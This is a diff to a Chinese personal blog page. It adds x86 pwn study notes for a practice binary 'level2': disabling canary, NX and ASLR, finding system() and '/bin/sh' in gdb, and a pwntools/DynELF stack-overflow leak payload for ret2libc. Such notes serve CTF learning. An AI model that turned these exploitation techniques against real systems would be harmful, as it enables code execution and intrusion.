@@ -19,7 +19,7 @@
     <script>
         var ExSearchConfig = {
             root: "",
-            api: "https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/8b3187bf059b6398e9931fa36ad78c15.json"
+            api: "https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/854cf620dc055f7b894dd1e3f4c28556.json"
         }
     </script>
     
@@ -86,10 +86,55 @@
 <h2>x86</h2>
 <h3>无保护</h3>
 <ul>
-<li>关掉canary:  <strong>-fno-stack-protector</strong> </li>
-<li>关掉NX:  <strong>-z execstack</strong> </li>
-<li>关掉PIE:  <strong>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</strong> </li>
+<li>关掉canary:  <strong>-fno-stack-protector</strong></li>
+<li>关掉NX:  <strong>-z execstack</strong></li>
+<li>关掉PIE:  <strong>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</strong></li>
 </ul>
+<h3>绕过NX</h3>
+<p>gdb下找<code>system()</code>和<code>"/bin/sh\x00"</code>的地址:</p>
+<div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span> print system
+<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e5f460 &lt;system&gt;
+<span class="o">(</span>gdb<span class="o">)</span> print __libc_start_main
+<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e393f0 &lt;__libc_start_main&gt;
+<span class="o">(</span>gdb<span class="o">)</span> find 0xb7e393f0, +2200000, <span class="s2">&quot;/bin/sh&quot;</span>
+0xb7f81ff8
+<span class="o">(</span>gdb<span class="o">)</span> x/s 0xb7f81ff8
+0xb7f81ff8:  <span class="s2">&quot;/bin/sh&quot;</span>
+</pre></div>
+<h3>绕过NX和PIE</h3>
+<ul>
+<li>看plt : <strong>objdump -d -j .plt level2</strong></li>
+<li>看got : <strong>objdump -R level2</strong></li>
+<li>查看目标程序调用的so库 : <strong>ldd level2</strong></li>
+</ul>
+<p>用pwntools:</p>
+<div class="highlight"><pre><span></span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;level2&#39;</span><span class="p">)</span>
+<span class="n">plt_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+<span class="n">got_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc.so&#39;</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
+</pre></div>
+<h3>无libc.so</h3>
+<p>步骤:</p>
+<ol>
+<li>泄露<code>__libc_start_main</code>地址</li>
+<li>获取<code>libc</code>版本</li>
+<li>获取<code>system</code>地址与<code>/bin/sh</code>的地址</li>
+<li>再次执行源程序</li>
+<li>触发栈溢出执行<code>system(“/bin/sh”)</code></li>
+</ol>
+<p>DynELF的使用:</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
+    <span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">vulfun_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="s2">&quot;</span><span class="si">%#x</span><span class="s2"> =&gt; </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="p">(</span><span class="n">data</span> <span class="ow">or</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">data</span>
+
+<span class="n">d</span> <span class="o">=</span> <span class="n">DynELF</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./level2&#39;</span><span class="p">))</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;libc&#39;</span><span class="p">)</span>
+</pre></div>
 
             </div>
         </article>
